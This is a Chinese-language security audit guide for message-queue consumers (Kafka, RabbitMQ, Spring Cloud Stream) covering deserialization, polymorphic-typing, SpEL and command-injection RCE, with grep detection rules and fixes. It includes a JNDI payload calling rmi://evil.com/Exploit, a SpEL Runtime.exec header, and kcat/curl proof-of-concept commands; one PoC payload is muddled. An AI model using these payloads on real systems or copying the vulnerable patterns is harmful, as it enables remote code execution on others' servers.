# 消息队列 / 异步链路安全检测模块

> Kafka、RabbitMQ、异步消息处理、反序列化、延迟队列RCE

## 概述 (High Priority)

消息队列作为异步通信中间件，其Consumer端常存在反序列化、SpEL注入等RCE风险。

---

## 攻击链模型

```
用户输入 → MQ Producer → 消息存储 → Consumer反序列化/表达式执行 → RCE
```

---

## 检测类别

### 1. Consumer反序列化RCE

```java
// ❌ Critical: Kafka Consumer反序列化不受信任消息
@KafkaListener(topics = "orders")
public void handleOrder(byte[] message) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(message));
    Order order = (Order) ois.readObject();  // 反序列化RCE!
    processOrder(order);
}

// ❌ RabbitMQ with SimpleMessageConverter
@RabbitListener(queues = "tasks")
public void handleTask(Object task) {  // 默认Java反序列化
    // task可能包含gadget chain
}
```

**检测**:
```bash
grep -rn "@KafkaListener\|@RabbitListener" --include="*.java" -A 10 | \
  grep "ObjectInputStream\|readObject"

grep -rn "SimpleMessageConverter" --include="*.java"
```

**安全修复**:
```java
// ✓ 使用JSON/Protobuf而非Java序列化
@KafkaListener(topics = "orders")
public void handleOrder(String jsonMessage) {  // JSON String
    Order order = objectMapper.readValue(jsonMessage, Order.class);
    processOrder(order);
}

// ✓ RabbitMQ使用Jackson2JsonMessageConverter
@Bean
public MessageConverter jsonMessageConverter() {
    return new Jackson2JsonMessageConverter();
}
```

### 2. Jackson Polymorphic Typing RCE

```java
// ❌ Critical: Jackson enableDefaultTyping
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // 启用多态类型，危险!

// 消息: {"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com/Exploit","autoCommit":true}

@KafkaListener(topics = "events")
public void handle(String json) {
    Event event = mapper.readValue(json, Event.class);  // RCE via polymorphic typing
}
```

**检测**:
```bash
grep -rn "enableDefaultTyping\|activateDefaultTyping" --include="*.java"
grep -rn "@JsonTypeInfo.*use.*Id\.CLASS" --include="*.java"
```

**安全修复**:
```java
// ✓ 禁用default typing，使用@JsonSubTypes白名单
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = OrderEvent.class, name = "order"),
    @JsonSubTypes.Type(value = PaymentEvent.class, name = "payment")
})
public abstract class Event {}

// ✓ 或使用PolymorphicTypeValidator (Jackson 2.10+)
ObjectMapper mapper = JsonMapper.builder()
    .activateDefaultTyping(
        BasicPolymorphicTypeValidator.builder()
            .allowIfBaseType(Event.class)
            .build(),
        ObjectMapper.DefaultTyping.NON_FINAL
    )
    .build();
```

### 3. Spring Cloud Stream自动绑定RCE

```java
// ❌ High: Spring Cloud Stream + SpEL header
// application.yml
spring:
  cloud:
    stream:
      bindings:
        input:
          destination: orders

// 消息Header: spring.cloud.function.definition=T(java.lang.Runtime).getRuntime().exec('calc')

@StreamListener("input")
public void handle(Message<Order> message) {
    // Spring自动处理Header中的SpEL表达式 → RCE
}
```

**检测**:
```bash
grep -rn "spring.cloud.stream" application.yml
grep -rn "@StreamListener\|@ServiceActivator" --include="*.java"
```

**安全修复**:
```yaml
# ✓ 禁用SpEL header处理
spring:
  cloud:
    stream:
      bindings:
        input:
          consumer:
            use-native-decoding: true  # 禁用自动解析
```

### 4. 延迟队列命令注入

```java
// ❌ High: 延迟队列执行用户可控命令
@Scheduled(fixedDelay = 5000)
public void processDelayedTasks() {
    List<DelayedTask> tasks = taskRepo.findDue();
    for (DelayedTask task : tasks) {
        String command = task.getCommand();  // 用户创建任务时指定
        Runtime.getRuntime().exec(command);  // 命令注入!
    }
}
```

**检测**:
```bash
grep -rn "DelayedQueue\|@Scheduled" --include="*.java" -A 15 | \
  grep "exec\|ProcessBuilder"
```

**安全修复**:
```java
// ✓ 白名单任务类型
enum TaskType {
    SEND_EMAIL, GENERATE_REPORT, CLEANUP_FILES
}

public void processTask(DelayedTask task) {
    switch (task.getType()) {
        case SEND_EMAIL:
            emailService.send(task.getRecipient(), task.getBody());
            break;
        case GENERATE_REPORT:
            reportService.generate(task.getReportId());
            break;
        default:
            throw new IllegalArgumentException("Unknown task type");
    }
}
```

---

## 综合检测清单

### Critical
- [ ] MQ Consumer使用Java反序列化
- [ ] Jackson enableDefaultTyping + 消息队列
- [ ] 延迟队列执行用户可控命令/脚本

### High
- [ ] Spring Cloud Stream自动绑定SpEL Header
- [ ] RabbitMQ SimpleMessageConverter
- [ ] 消息体包含表达式语言(SpEL/OGNL)

### Medium
- [ ] 消息验证不足（签名/HMAC缺失）
- [ ] Consumer异常处理不当导致消息丢失

---

## 最小 PoC 示例
```bash
# Kafka 发送恶意 JSON 多态
kcat -b broker:9092 -t topic -P <<'EOF'
{"@class":"com.evil.Evil","cmd":"calc"}
EOF

# RabbitMQ 延迟队列命令注入 (Spring)
curl -X POST http://app/send -H "Content-Type: application/json" \
  -d '{"msg":"ls","delay":"java.lang.Runtime"}'
```

---

## False Positive

- ✅ 消息队列仅内部服务间通信且Producer可信（需证明）
- ✅ 使用JSON/Protobuf + 明确类型映射
- ✅ 消息签名验证 + Content-Type强制

---

## 参考

- CVE-2017-8046: Spring Data REST SpEL RCE
- CVE-2020-36518: Jackson Polymorphic Typing
- OWASP: Deserialization Cheat Sheet
- Kafka Security Best Practices
